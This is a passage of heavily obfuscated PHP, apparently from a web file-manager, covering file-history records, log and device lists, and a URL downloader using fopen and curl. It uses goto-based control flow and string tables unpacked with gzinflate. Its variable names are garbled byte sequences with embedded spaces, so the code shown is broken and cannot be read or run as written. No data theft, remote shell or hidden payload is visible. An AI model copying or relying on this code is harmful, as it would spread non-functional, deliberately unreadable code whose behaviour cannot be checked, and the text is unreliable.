¬Ê…[29]], $ağ¼ß ¬Ê…[1896]) !== 0) { continue; } if (!IO::init($aò½µ¨„Ø[$ağ¼ß ¬Ê…[84]])) { continue; } if (!($D® °¹ˆ™ä = IO::infoFull($aò½µ¨„Ø[$ağ¼ß ¬Ê…[84]]))) { continue; } goto BÙæ†âí×›; fäÚ›¶°•©: continue; goto FŒ©Å·ÕˆÃ; FŒ©Å·ÕˆÃ: } $E…ì£Ç–Œß[] = $aò½µ¨„Ø[$ağ¼ß ¬Ê…[382]]; $E…ì£Ç–Œß[] = $aò½µ¨„Ø[$ağ¼ß ¬Ê…[1726]]; if ($aò½µ¨„Ø[$ağ¼ß ¬Ê…[29]] == $ağ¼ß ¬Ê…[742]) { $E…ì£Ç–Œß[] = $aò½µ¨„Ø[$ağ¼ß ¬Ê…[1590]][$ağ¼ß ¬Ê…[752]]; $E…ì£Ç–Œß[] = $aò½µ¨„Ø[$ağ¼ß ¬Ê…[1590]][$ağ¼ß ¬Ê…[753]]; } if ($aò½µ¨„Ø[$ağ¼ß ¬Ê…[29]] == $ağ¼ß ¬Ê…[1730]) { $E…ì£Ç–Œß[] = $aò½µ¨„Ø[$ağ¼ß ¬Ê…[1590]][$ağ¼ß ¬Ê…[382]]; } } if (!$E…ì£Ç–Œß) { return array(); } return Model($ağ¼ß ¬Ê…[529])->sourceListInfo($E…ì£Ç–Œß, !0); } private function logList($fÉ¨‡“Ê§…) { goto fêÏ«Î¾; fêÏ«Î¾: $FÅöØ¤š×Ë =& $_SERVER[°Óó£ÌİóèÅ]; $Aç„’†½•ƒ = array_to_keyvalue($fÉ¨‡“Ê§…, $FÅöØ¤š×Ë[33], $FÅöØ¤š×Ë[1095]); $EˆùŸ’Ø = Model($FÅöØ¤š×Ë[1481])->userListInfo(array_unique($Aç„’†½•ƒ)); goto b˜°ÉÔ¥´¨; F²‹„ÄŠç: foreach ($fÉ¨‡“Ê§… as $fîÉ·‰ôğ => $DÚ´ñÛğÉ) { goto C®’Øñ¿•»; Eêå™óÙ“’: $F ƒëÍƒ¹‰ = json_decode($DÚ´ñÛğÉ[$FÅöØ¤š×Ë[1590]], !0); $DÚ´ñÛğÉ[$FÅöØ¤š×Ë[1891]] = isset($F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1891]]) ? $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1891]] : $FÅöØ¤š×Ë[33]; $this->ipAddress($DÚ´ñÛğÉ); goto Fõ¡«É‚¥İ; AÂ¾å²Üƒ…: $DÚ´ñÛğÉ[$FÅöØ¤š×Ë[1770]] = isset($EˆùŸ’Ø[$FŞÁîà½Å][$FÅöØ¤š×Ë[1770]]) ? $EˆùŸ’Ø[$FŞÁîà½Å][$FÅöØ¤š×Ë[1770]] : $FÅöØ¤š×Ë[33]; $DÚ´ñÛğÉ[$FÅöØ¤š×Ë[1001]] = isset($B¸•§¬—[$A­Ş—±±É]) ? $B¸•§¬—[$A­Ş—±±É] : (strpos($A­Ş—±±É, $FÅöØ¤š×Ë[1897]) == 0 ? LNG($FÅöØ¤š×Ë[1898]) : LNG($FÅöØ¤š×Ë[1894])); $DÚ´ñÛğÉ[$FÅöØ¤š×Ë[1688]] = isset($EˆùŸ’Ø[$FŞÁîà½Å]) ? $EˆùŸ’Ø[$FŞÁîà½Å] : !1; goto Eêå™óÙ“’; Fõ¡«É‚¥İ: if (strpos($A­Ş—±±É, $FÅöØ¤š×Ë[1727]) === 0 || isset($F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1726]])) { goto d‚Š™Í…ÉÙ; D²Í¶°ÃŸ: if ($F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[29]] == $FÅöØ¤š×Ë[1730]) { $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1590]][$FÅöØ¤š×Ë[382]] = $cïÅ¦±¼‰ù[$F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1590]][$FÅöØ¤š×Ë[382]]]; } if ($F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[29]] == $FÅöØ¤š×Ë[1514]) { $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1736]] = $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[858]]; $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1726]] = $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1736]][$FÅöØ¤š×Ë[382]]; $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[858]] = !1; $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[382]] = $FÅöØ¤š×Ë[33]; } if ($F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[858]] && $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[858]][$FÅöØ¤š×Ë[401]] == $FÅöØ¤š×Ë[824]) { unset($fÉ¨‡“Ê§…[$fîÉ·‰ôğ]); continue; } goto bÚá©—ù‘©; d‚Š™Í…ÉÙ: $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[858]] = $cïÅ¦±¼‰ù[$F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[382]]]; $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1736]] = $cïÅ¦±¼‰ù[$F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1726]]]; if ($F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[29]] == $FÅöØ¤š×Ë[742]) { $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1590]][$FÅöØ¤š×Ë[752]] = $cïÅ¦±¼‰ù[$F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1590]][$FÅöØ¤š×Ë[752]]]; $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1590]][$FÅöØ¤š×Ë[753]] = $cïÅ¦±¼‰ù[$F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1590]][$FÅöØ¤š×Ë[753]]]; } goto D²Í¶°ÃŸ; bÚá©—ù‘©: if ($F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1736]] && $F ƒëÍƒ¹‰[$FÅöØ¤š×Ë[1736]][$FÅöØ¤š×Ë[401]] == $FÅöØ¤š×Ë[824]) { unset($fÉ¨‡“Ê§…[$fîÉ·‰ôğ]); continue; } goto bÍ™æÍë; bÍ™æÍë: } $DÚ´ñÛğÉ[$FÅöØ¤š×Ë[1590]] = $F ƒëÍƒ¹‰; $EÜÖÓĞÛëÏ[] = $DÚ´ñÛğÉ; goto Bâô¼ğÑ¼; C®’Øñ¿•»: $A­Ş—±±É = $DÚ´ñÛğÉ[$FÅöØ¤š×Ë[29]]; $FŞÁîà½Å = $DÚ´ñÛğÉ[$FÅöØ¤š×Ë[1095]]; $DÚ´ñÛğÉ[$FÅöØ¤š×Ë[28]] = isset($EˆùŸ’Ø[$FŞÁîà½Å][$FÅöØ¤š×Ë[28]]) ? $EˆùŸ’Ø[$FŞÁîà½Å][$FÅöØ¤š×Ë[28]] : LNG($FÅöØ¤š×Ë[1894]); goto AÂ¾å²Üƒ…; Bâô¼ğÑ¼: } return $EÜÖÓĞÛëÏ; goto fœ¸Ëùˆæ; b˜°ÉÔ¥´¨: $cïÅ¦±¼‰ù = $this->getSourceList($fÉ¨‡“Ê§…); $B¸•§¬— = $this->typeAll(); $EÜÖÓĞÛëÏ = array(); goto F²‹„ÄŠç; fœ¸Ëùˆæ: } public function deviceList($eé°·ƒ•«¨, $dÙ¹ÄÄ µæ = null) { goto DÏƒ•ôºö; DÏƒ•ôºö: $dƒ’é…¥¶â =& $_SERVER[°Óó£ÌİóèÅ]; $AÄ¿ÅêˆˆÂ = array($dƒ’é…¥¶â[1095] => $eé°·ƒ•«¨, $dƒ’é…¥¶â[29] => $dƒ’é…¥¶â[1486]); if ($dÙ¹ÄÄ µæ) { $AÄ¿ÅêˆˆÂ[$dƒ’é…¥¶â[195]] = array($dƒ’é…¥¶â[695], $dÙ¹ÄÄ µæ); } goto bÉŞí…°; bÉŞí…°: $e³š¬”Ã“Ù = $this->where($AÄ¿ÅêˆˆÂ)->order($dƒ’é…¥¶â[1733])->select(); $cº™ÖÕÈÚ¨ = array(); foreach ($e³š¬”Ã“Ù as $AØôî„¦‘… => &$a½ââç¦Ã) { goto dÇ­¯å¼¢„; dÇ­¯å¼¢„: $fœ£ö™ª†â = json_decode($a½ââç¦Ã[$dƒ’é…¥¶â[1590]], !0); $a½ââç¦Ã[$dƒ’é…¥¶â[1891]] = isset($fœ£ö™ª†â[$dƒ’é…¥¶â[1891]]) ? $fœ£ö™ª†â[$dƒ’é…¥¶â[1891]] : $dƒ’é…¥¶â[33]; unset($fœ£ö™ª†â[$dƒ’é…¥¶â[1891]]); goto f›Şƒ´â‘; aÛºœ­İ™¬: $a½ââç¦Ã[$dƒ’é…¥¶â[1590]] = $fœ£ö™ª†â; $cº™ÖÕÈÚ¨[$d‡óñÛ­™] = $a½ââç¦Ã; goto b¥ğ¤ö¨»; f›Şƒ´â‘: $d‡óñÛ­™ = md5(json_encode($fœ£ö™ª†â)); if (isset($cº™ÖÕÈÚ¨[$d‡óñÛ­™])) { unset($e³š¬”Ã“Ù[$AØôî„¦‘…]); continue; } $this->ipAddress($a½ââç¦Ã); goto aÛºœ­İ™¬; b¥ğ¤ö¨»: } goto fºÑôèŠ™; fºÑôèŠ™: return array_values($cº™ÖÕÈÚ¨); goto aàˆãæœî²; aàˆãæœî²: } } goto fç’×é½²Ú; F¶À–¢ğ±: define($_SERVER[°Óó£ÌİóèÅ][1737], $_SERVER[°Óó£ÌİóèÅ][1738]); $_SERVER[õ«­] = explode($_SERVER[°Óó£ÌİóèÅ][1739], gzinflate(substr($_SERVER[°Óó£ÌİóèÅ][1740], 10, -8))); class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\x72\143\145\137\x68\x69\x73\164\x6f\162\171"; public function addHistory($fÃ›îŒ‡Õ¢, $Fêõ×§ë‹• = '') { $Dˆ ĞÌÂœ¿ =& $_SERVER[õ«­]; $aãË¶Õó„µ = array($Dˆ ĞÌÂœ¿[0] => $fÃ›îŒ‡Õ¢[$Dˆ ĞÌÂœ¿[1]], $Dˆ ĞÌÂœ¿[2] => isset($fÃ›îŒ‡Õ¢[$Dˆ ĞÌÂœ¿[3]]) ? $fÃ›îŒ‡Õ¢[$Dˆ ĞÌÂœ¿[3]] : $fÃ›îŒ‡Õ¢[$Dˆ ĞÌÂœ¿[4]], $Dˆ ĞÌÂœ¿[5] => $fÃ›îŒ‡Õ¢[$Dˆ ĞÌÂœ¿[6]], $Dˆ ĞÌÂœ¿[7] => $fÃ›îŒ‡Õ¢[$Dˆ ĞÌÂœ¿[8]], $Dˆ ĞÌÂœ¿[9] => $Fêõ×§ë‹•); $this->historyAutoClear($aãË¶Õó„µ[$Dˆ ĞÌÂœ¿[1]]); $this->add($aãË¶Õó„µ); Model($Dˆ ĞÌÂœ¿[10])->eventFileEdit($fÃ›îŒ‡Õ¢[$Dˆ ĞÌÂœ¿[1]]); } private function historyAutoClear($C¿…Á£èÀ) { goto c—îÁ¼‚‘·; böìÌ„«ÑŸ: $B—ö»‡áà = $f·¥•ö£ºÖ - 1; if ($B—ö»‡áà >= 500) { return; } $AÆØÃÅ‘äÇ = array($e¯½÷õÕ²[0] => $C¿…Á£èÀ); goto D’œÁÌ˜å; F°âƒ¡¶å‘: $A¥ˆ¥„Ÿ‘ = array_slice($A¥ˆ¥„Ÿ‘, $B—ö»‡áà); $D‚†İœ†êÀ = array_to_keyvalue($DˆÓçé…Š, $e¯½÷õÕ²[19], $e¯½÷õÕ²[6]); $D‚†İœ†êÀ = array_slice($D‚†İœ†êÀ, $B—ö»‡áà); goto DÕ‚æ²Ş‹ğ; c—îÁ¼‚‘·: $e¯½÷õÕ² =& $_SERVER[õ«­]; $F×ÆèĞ ö’ = Model($e¯½÷õÕ²[11])->get($e¯½÷õÕ²[12]); $f·¥•ö£ºÖ = $F×ÆèĞ ö’ == $e¯½÷õÕ²[13] ? 3 : $GLOBALS[$e¯½÷õÕ²[14]][$e¯½÷õÕ²[15]][$e¯½÷õÕ²[16]]; goto böìÌ„«ÑŸ; D’œÁÌ˜å: $DˆÓçé…Š = $this->field($e¯½÷õÕ²[17])->where($AÆØÃÅ‘äÇ)->order($e¯½÷õÕ²[18])->select(); if (!$DˆÓçé…Š || $B—ö»‡áà >= count($DˆÓçé…Š)) { return; } $A¥ˆ¥„Ÿ‘ = array_to_keyvalue($DˆÓçé…Š, $e¯½÷õÕ²[19], $e¯½÷õÕ²[20]); goto F°âƒ¡¶å‘; DÕ‚æ²Ş‹ğ: $AÆØÃÅ‘äÇ = array($e¯½÷õÕ²[21] => array($e¯½÷õÕ²[22], $A¥ˆ¥„Ÿ‘)); $this->where($AÆØÃÅ‘äÇ)->delete(); Model($e¯½÷õÕ²[23])->remove($D‚†İœ†êÀ); goto eÃÕˆäÄÉ; eÃÕˆäÄÉ: } public function listData($dß¿ëâ¨èè) { goto E»Õøé‘’; E»Õøé‘’: $a©˜á·£±Ñ =& $_SERVER[õ«­]; $dœÇ’‡æ²é = array($a©˜á·£±Ñ[0] => $dß¿ëâ¨èè); $F÷ìùƒá·î = $a©˜á·£±Ñ[24]; goto D“½©ˆ¾·µ; D“½©ˆ¾·µ: $C•˜°îŒ× = $this->field($F÷ìùƒá·î)->where($dœÇ’‡æ²é)->order($a©˜á·£±Ñ[18])->selectPage(); $this->_listAppendUser($C•˜°îŒ×[$a©˜á·£±Ñ[25]]); $dÍ¡‚æíß = Model($a©˜á·£±Ñ[11])->get($a©˜á·£±Ñ[12]); goto BŠ“ÂÕµ”½; BŠ“ÂÕµ”½: $DÊÈÛ£®¤ = 3; if ($dÍ¡‚æíß == $a©˜á·£±Ñ[13]) { $C•˜°îŒ×[$a©˜á·£±Ñ[25]] = array_slice($C•˜°îŒ×[$a©˜á·£±Ñ[25]], 0, $DÊÈÛ£®¤); $C•˜°îŒ×[$a©˜á·£±Ñ[26]] = array($a©˜á·£±Ñ[27] => 1, $a©˜á·£±Ñ[28] => 20, $a©˜á·£±Ñ[29] => 1, $a©˜á·£±Ñ[30] => count($C•˜°îŒ×[$a©˜á·£±Ñ[25]])); } return $C•˜°îŒ×; goto A—·Ò³’; A—·Ò³’: } protected function _listAppendUser(&$båò‰¹İŠ¬) { $d–ê¾Â·àÀ =& $_SERVER[õ«­]; $fˆÔÈÊë² = array_to_keyvalue($båò‰¹İŠ¬, $d–ê¾Â·àÀ[19], $d–ê¾Â·àÀ[31]); $a×–™ÃĞ±¾ = Model($d–ê¾Â·àÀ[32])->userListInfo($fˆÔÈÊë²); foreach ($båò‰¹İŠ¬ as &$Fìé»‡¾ò²) { $F‰î«õ½÷Ï = $Fìé»‡¾ò²[$d–ê¾Â·àÀ[31]]; $Fìé»‡¾ò²[$d–ê¾Â·àÀ[4]] = $a×–™ÃĞ±¾[$F‰î«õ½÷Ï] ? $a×–™ÃĞ±¾[$F‰î«õ½÷Ï] : !1; } } public function fileInfo($aâÍƒ¾Ÿ) { $d™àˆµØÓã =& $_SERVER[õ«­]; $c…Æ›À´Ê = $this->tablePrefix; $cÍšÉ´…Ä = "{$c…Æ›À´Ê}\151\157\x5f\146\151\154\x65\x20\146\x69\154\145\x73\x20\157\x6e\x20\x66\151\x6c\x65\x73\x2e\146\151\154\x65\x49\104\x20\75\x20\x68\151\x73\164\157\x72\x79\56\x66\151\x6c\x65\111\x44"; return $this->alias($d™àˆµØÓã[33])->where(array($d™àˆµØÓã[21] => $aâÍƒ¾Ÿ))->join($cÍšÉ´…Ä, $d™àˆµØÓã[34])->find(); } public function removeItem($B…±¹‹ã…) { $d…†‚¨ãÆÌ =& $_SERVER[õ«­]; $e¯í¼èÁËÚ = array($d…†‚¨ãÆÌ[21] => $B…±¹‹ã…); $bË×µÆ©­º = $this->where($e¯í¼èÁËÚ)->find(); if ($bË×µÆ©­º) { $b»‚ÀŠ…ˆ = $this->where($e¯í¼èÁËÚ)->delete(); Model($d…†‚¨ãÆÌ[23])->remove($bË×µÆ©­º[$d…†‚¨ãÆÌ[6]]); return $b»‚ÀŠ…ˆ; } return !1; } public function removeBySource($E—Ô«ŒßÊ¸) { goto C­îÎ­Ü´Š; C­îÎ­Ü´Š: $F¨ õğà”ô =& $_SERVER[õ«­]; if (!$E—Ô«ŒßÊ¸) { return !1; } if (!is_array($E—Ô«ŒßÊ¸)) { $E—Ô«ŒßÊ¸ = array($E—Ô«ŒßÊ¸); } goto dæ¯¢èÏŒ; dæ¯¢èÏŒ: $f‘“»¾ÇÍá = array($F¨ õğà”ô[0] => array($F¨ õğà”ô[22], $E—Ô«ŒßÊ¸)); $F„•ëÂÑÜƒ = $this->field($F¨ õğà”ô[5])->where($f‘“»¾ÇÍá)->select(); if ($F„•ëÂÑÜƒ) { $this->where($f‘“»¾ÇÍá)->delete(); $Eä§Ñæ…œ = array_to_keyvalue($F„•ëÂÑÜƒ, $F¨ õğà”ô[19], $F¨ õğà”ô[6]); Model($F¨ õğà”ô[23])->remove($Eä§Ñæ…œ); } goto dÔ£Ğâº‚‰; dÔ£Ğâº‚‰: return !0; goto cÍ½¥­ÊÃ¥; cÍ½¥­ÊÃ¥: } public function setDetail($d·í™òŞ±Ô, $C°¦–Äƒ¨ù) { $e™£¨ñÃèŸ =& $_SERVER[õ«­]; return $this->where(array($e™£¨ñÃèŸ[21] => $d·í™òŞ±Ô))->save(array($e™£¨ñÃèŸ[9] => $C°¦–Äƒ¨ù)); } public function rollbackToItem($Dñ’‚Â‘ô, $D¨ñ“™îÏö) { goto aŞË°‰š™‡; d£‡ ³ÔĞ: return $this->where(array($b’±íŒÊ«[21] => $D¨ñ“™îÏö))->delete(); goto b«˜×¹…‹Ì; aŞË°‰š™‡: $b’±íŒÊ« =& $_SERVER[õ«­]; $d‚ï¥Î¯â = Model($b’±íŒÊ«[35])->sourceInfo($Dñ’‚Â‘ô); $this->addHistory($d‚ï¥Î¯â); goto F–Ú‚áÎÄ«; F–Ú‚áÎÄ«: $f²Ò»ö»Ø÷ = $this->find($D¨ñ“™îÏö); $bô›šš·‹ = array($b’±íŒÊ«[6] => $f²Ò»ö»Ø÷[$b’±íŒÊ«[6]], $b’±íŒÊ«[8] => $f²Ò»ö»Ø÷[$b’±íŒÊ«[8]], $b’±íŒÊ«[36] => time(), $b’±íŒÊ«[3] => USER_ID); Model($b’±íŒÊ«[35])->where(array($b’±íŒÊ«[1] => $Dñ’‚Â‘ô))->save($bô›šš·‹); goto d£‡ ³ÔĞ; b«˜×¹…‹Ì: } public function clearSame($Eä…èø½•¸) { goto Aóœá‚®à ; Aóœá‚®à : $fªã—ÛÇƒÔ =& $_SERVER[õ«­]; $EáÙÉÔÑ = $this->listData($Eä…èø½•¸); $B‰³Ş£½”µ = array_to_keyvalue_group($EáÙÉÔÑ, $fªã—ÛÇƒÔ[6]); goto A„êÖ…×ï; A„êÖ…×ï: $BØá½²Ø½¹ = array(); $A·Õó“Ç­ = array(); foreach ($B‰³Ş£½”µ as $aƒàùƒÆ¥) { if (count($aƒàùƒÆ¥) <= 1) { continue; } foreach ($aƒàùƒÆ¥ as $a¿¯äêéË) { $BØá½²Ø½¹[] = $a¿¯äêéË[$fªã—ÛÇƒÔ[6]]; $A·Õó“Ç­[] = $a¿¯äêéË[$fªã—ÛÇƒÔ[20]]; } } goto Bóà†ˆÑ¸©; Bóà†ˆÑ¸©: if (!$A·Õó“Ç­) { return; } $this->where(array($fªã—ÛÇƒÔ[20] => array($fªã—ÛÇƒÔ[22], $A·Õó“Ç­)))->delete(); Model($fªã—ÛÇƒÔ[23])->remove($BØá½²Ø½¹); goto b¡¨‚•Å´µ; b¡¨‚•Å´µ: } public function userSpace() { $aËØ¦ì =& $_SERVER[õ«­]; $c©µÓÉ‡´© = $this->tablePrefix; $B•Ëæº”¹† = array($aËØ¦ì[2] => USER_ID); $EĞªÉˆ”ö = "{$c©µÓÉ‡´©}\151\157\x5f\146\x69\x6c\x65\x20\146\x69\154\x65\163\40\x6f\156\x20\x66\x69\154\x65\163\x2e\146\x69\x6c\x65\x49\x44\40\75\40\x68\151\163\164\x6f\162\171\56\146\x69\x6c\145\111\x44"; return $this->alias($aËØ¦ì[33])->where($B•Ëæº”¹†)->join($EĞªÉˆ”ö, $aËØ¦ì[34])->sum($aËØ¦ì[8]); } } goto aÖ„ãÑÜĞ°; bË…ŞÑóéò: function ActionCall($Dòƒß‘£´) { $bĞÑö†Ñƒ = array_slice(func_get_args(), 1); return ActionApply($Dòƒß‘£´, $bĞÑö†Ñƒ); } function ActionCallHook($c›ó„ÁŠï) { goto AÏíøà½®; bµç‹¥¦¯: $GLOBALS[$bÌ¹í‰—¢š[18]] = 1; $C¼­Œ‡®Ú = ActionApply($c›ó„ÁŠï, $bùõôÕ„ëÙ); $E±÷Å•Ù½´ = ob_get_clean(); goto b´ ³‰óæ; b´ ³‰óæ: $C¼­Œ‡®Ú = $E±÷Å•Ù½´ ? json_decode($E±÷Å•Ù½´, !0) : $C¼­Œ‡®Ú; $GLOBALS[$bÌ¹í‰—¢š[18]] = 0; return $C¼­Œ‡®Ú; goto a³ÛªŒñ¹; AÏíøà½®: $bÌ¹í‰—¢š =& $_SERVER[³ªí]; ob_start(); $bùõôÕ„ëÙ = array_slice(func_get_args(), 1); goto bµç‹¥¦¯; a³ÛªŒñ¹: } function beforeShutdown() { Hook::trigger($_SERVER[³ªí][19]); } goto eÏĞáÃ×æˆ; cæ §õ©šó: class Downloader { static function start($aæº²¢ˆ, $aø¢‘ßÖõÎ, $c—»ïİğË = 10) { goto fÒšÀå¿Î; bó‘äœ‘¦Œ: $Cõ²øçæğ = intval($dâ¯•ó½Åß[$aòµ˜¢Ğ¬ä[336]]); if (file_exists($Cõù‚³ÍìÉ) && time() - filemtime($Cõù‚³ÍìÉ) < 3) { return array($aòµ˜¢Ğ¬ä[781] => !1, $aòµ˜¢Ğ¬ä[783] => $aòµ˜¢Ğ¬ä[1163]); } $bîõª¥–Á½ = array(); goto fšøŠ–›œŠ; fšøŠ–›œŠ: if (is_file($DçßŠŒÚÜß)) { $E¢˜ Ä“î´ = file_get_contents($DçßŠŒÚÜß); $bîõª¥–Á½ = json_decode($E¢˜ Ä“î´, 1); } if (file_exists($aø¢‘ßÖõÎ) && $Cõ²øçæğ == filesize($aø¢‘ßÖõÎ)) { @unlink($Cõù‚³ÍìÉ); @unlink($DçßŠŒÚÜß); return array($aòµ˜¢Ğ¬ä[781] => !0, $aòµ˜¢Ğ¬ä[783] => $aòµ˜¢Ğ¬ä[1164]); } if ($bîõª¥–Á½[$aòµ˜¢Ğ¬ä[336]] != $Cõ²øçæğ) { $bîõª¥–Á½ = array($aòµ˜¢Ğ¬ä[336] => $Cõ²øçæğ); } goto eæ¾†…¯ŸÌ; fÒšÀå¿Î: $aòµ˜¢Ğ¬ä =& $_SERVER[°Óó£ÌİóèÅ]; if (!request_url_safe($aæº²¢ˆ)) { return array($aòµ˜¢Ğ¬ä[781] => !1, $aòµ˜¢Ğ¬ä[783] => $aòµ˜¢Ğ¬ä[786]); } $DçßŠŒÚÜß = $aø¢‘ßÖõÎ . $aòµ˜¢Ğ¬ä[1160]; goto C¯®­æœõ…; eæ¾†…¯ŸÌ: if ($CÆùÈéñ‚è > $Cõ²øçæğ) { @unlink($Cõù‚³ÍìÉ); } file_put_contents($DçßŠŒÚÜß, json_encode($bîõª¥–Á½)); $c »›á¡„¤ = self::fileDownloadCurl($aæº²¢ˆ, $aø¢‘ßÖõÎ, !0, $CÆùÈéñ‚è, $Cõ²øçæğ); goto D«‰¬¾Æö; C¯®­æœõ…: $Cõù‚³ÍìÉ = $aø¢‘ßÖõÎ . $aòµ˜¢Ğ¬ä[1161]; if (is_array($aæº²¢ˆ)) { $dâ¯•ó½Åß = $aæº²¢ˆ; } else { $dâ¯•ó½Åß = url_header($aæº²¢ˆ); } $aæº²¢ˆ = $dâ¯•ó½Åß[$aòµ˜¢Ğ¬ä[306]]; goto CÕƒîæ•‘¥; CÕƒîæ•‘¥: if (!$aæº²¢ˆ) { return array($aòµ˜¢Ğ¬ä[781] => !1, $aòµ˜¢Ğ¬ä[783] => $aòµ˜¢Ğ¬ä[786]); } if (!$dâ¯•ó½Åß[$aòµ˜¢Ğ¬ä[1162]] || $dâ¯•ó½Åß[$aòµ˜¢Ğ¬ä[336]] == 0) { @unlink($Cõù‚³ÍìÉ); @unlink($aø¢‘ßÖõÎ); $c »›á¡„¤ = self::fileDownloadFopen($aæº²¢ˆ, $aø¢‘ßÖõÎ, $dâ¯•ó½Åß[$aòµ˜¢Ğ¬ä[336]]); if ($c »›á¡„¤[$aòµ˜¢Ğ¬ä[781]]) { return $c »›á¡„¤; } else { @unlink($Cõù‚³ÍìÉ); @unlink($aø¢‘ßÖõÎ); $c »›á¡„¤ = self::fileDownloadCurl($aæº²¢ˆ, $aø¢‘ßÖõÎ, !1, 0, $dâ¯•ó½Åß[$aòµ˜¢Ğ¬ä[336]]); @unlink($Cõù‚³ÍìÉ); return $c »›á¡„¤; } } $CÆùÈéñ‚è = is_file($Cõù‚³ÍìÉ) ? filesize($Cõù‚³ÍìÉ) : 0; goto bó‘äœ‘¦Œ; D«‰¬¾Æö: if ($c »›á¡„¤[$aòµ˜¢Ğ¬ä[781]]) { @unlink($DçßŠŒÚÜß); } return $c »›á¡„¤; goto EŸŒ °†®; EŸŒ °†®: } static function fileDownloadFopen($AÄ‚Ø†ŞÈ, $e‡ÚŞ¡›Î¡, $f×Â™ÃÅì¬ = 0) { $DŒàãÅÚäƒ =& $_SERVER[°Óó£ÌİóèÅ]; @ini_set($DŒàãÅÚäƒ[1165], $DŒàãÅÚäƒ[1166]); $f»ÆØ¿¤ğ = $e‡ÚŞ¡›Î¡ . $DŒàãÅÚäƒ[1161]; set_timeout(); @unlink($f»ÆØ¿¤ğ); if ($b´·Œ¾Ä°Â = @fopen($AÄ‚Ø†ŞÈ, $DŒàãÅÚäƒ[1167])) { goto CÉÀ¿™ô“Û; bÈÕÓ§ô: self::checkGzip($f»ÆØ¿¤ğ); if (!@rename($f»ÆØ¿¤ğ, $e‡ÚŞ¡›Î¡)) { usleep(round(rand(0, 1000) * 50)); @unlink($e‡ÚŞ¡›Î¡); $a÷º‹ßñ = @rename($f»ÆØ¿¤ğ, $e‡ÚŞ¡›Î¡); if (!$a÷º‹ßñ) { return array($DŒàãÅÚäƒ[781] => !1, $DŒàãÅÚäƒ[783] => $DŒàãÅÚäƒ[1172]); } } return array($DŒàãÅÚäƒ[781] => !0, $DŒàãÅÚäƒ[783] => $DŒàãÅÚäƒ[461]); goto f¨¹–¦¼Å¿; CÉÀ¿™ô“Û: if (!($e¢©ĞƒßôÈ = @fopen($f»ÆØ¿¤ğ, $DŒàãÅÚäƒ[1168]))) { return array($DŒàãÅÚäƒ[781] => !1, $DŒàãÅÚäƒ[783] => $DŒàãÅÚäƒ[1169]); } while (!feof($b´·Œ¾Ä°Â)) { if (!file_exists($f»ÆØ¿¤ğ)) { fclose($e¢©ĞƒßôÈ); return array($DŒàãÅÚäƒ[781] => !1, $DŒàãÅÚäƒ[783] => $DŒàãÅÚäƒ[1170]); } clearstatcache(); if ($f×Â™ÃÅì¬ > 0 && $f×Â™ÃÅì¬ == filesize(iconv_system($f»ÆØ¿¤ğ))) { break; } fwrite($e¢©ĞƒßôÈ, fread($b´·Œ¾Ä°Â, 1024 * 8), 1024 * 8); } fclose($e¢©ĞƒßôÈ); goto EÍÈš¸ò”§; EÍÈš¸ò”§: fclose($b´·Œ¾Ä°Â); $fƒ¥ íÔùƒ = filesize(iconv_system($f»ÆØ¿¤ğ)); if ($f×Â™ÃÅì¬ != 0 && $fƒ¥ íÔùƒ != $f×Â™ÃÅì¬) { return array($DŒàãÅÚäƒ[781] => !1, $DŒàãÅÚäƒ[783] => $DŒàãÅÚäƒ[1171]); } goto bÈÕÓ§ô; f¨¹–¦¼Å¿: } else { return array($DŒàãÅÚäƒ[781] => !1, $DŒàãÅÚäƒ[783] => $DŒàãÅÚäƒ[1173]); } } static function fileDownloadCurl($FÒùŒœÓ¹Ú, $F ´›–èñ…, $eÓ¤ÅÂêç = false, $a’µ½Üë°» = 0, $cŒ¬¹«­Ú = 0) { goto AçíÇ‰ÎŞ; cí—ÀøÁ‡¹: curl_close($A‚ËÉ¦ù); fclose($cµ¯ô°à˜); $f‚Ÿƒ¾å = filesize(iconv_system($F‰Î¡ˆØÊ­)); goto B„ˆÔ­™‡’; DÔ¯¥Ôêµƒ: curl_setopt($A‚ËÉ¦ù, CURLOPT_NOPROGRESS, !1); curl_setopt($A‚ËÉ¦ù, CURLOPT_PROGRESSFUNCTION, $D¡Î­áó†à[967]); curl_progress_start($A‚ËÉ¦ù); goto c¡Æ»Ø››Ÿ; d×Ï¯¦‹Ñ‡: if ($eÓ¤ÅÂêç) { curl_setopt($A‚ËÉ¦ù, CURLOPT_RANGE, $a’µ½Üë°» . $D¡Î­áó†à[478]); } curl_setopt($A‚ËÉ¦ù, CURLOPT_FILE, $cµ¯ô°à˜); curl_setopt($A‚ËÉ¦ù, CURLOPT_REFERER, get_url_link($FÒùŒœÓ¹Ú)); goto b²Ñ¯öŠ; B„ˆÔ­™‡’: if ($f‚Ÿƒ¾å < $cŒ¬¹«­Ú && $cŒ¬¹«­Ú != 0) { return array($D¡Î­áó†à[781] => !1, $D¡Î­áó†à[783] => $D¡Î­áó†à[1163]); } if ($f‚Ÿƒ¾å > $cŒ¬¹«­Ú && $cŒ¬¹«­Ú != 0) { return array($D¡Î­áó†à[781] => !1, $D¡Î­áó†à[783] => $D¡Î­áó†à[1171]); } if ($b­Àøë÷¥ä && filesize($F‰Î¡ˆØÊ­) != 0) { 